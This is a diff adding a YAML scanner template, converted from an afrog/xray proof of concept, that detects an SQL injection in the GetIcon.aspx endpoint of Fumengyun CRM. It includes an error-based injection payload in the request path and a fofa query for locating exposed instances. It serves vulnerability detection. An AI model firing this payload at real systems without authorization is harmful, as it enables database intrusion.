@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - Microsoft SQL Server
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/Common/GetIcon.aspx?FUID=-1''and+1=@@VERSION--'
+id: fumengyun-crm-geticon-sqli
+info:
+  author: AVIC123
+  description: |-
+    孚盟云CRM GetIcon.aspx接口存在SQL注入漏洞
+    fofa: app="孚盟软件-孚盟云"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 孚盟云CRM GetIcon.aspx接口存在SQL注入漏洞
+  severity: high
+  tags: fumengyun,crm,sqli,argus-import
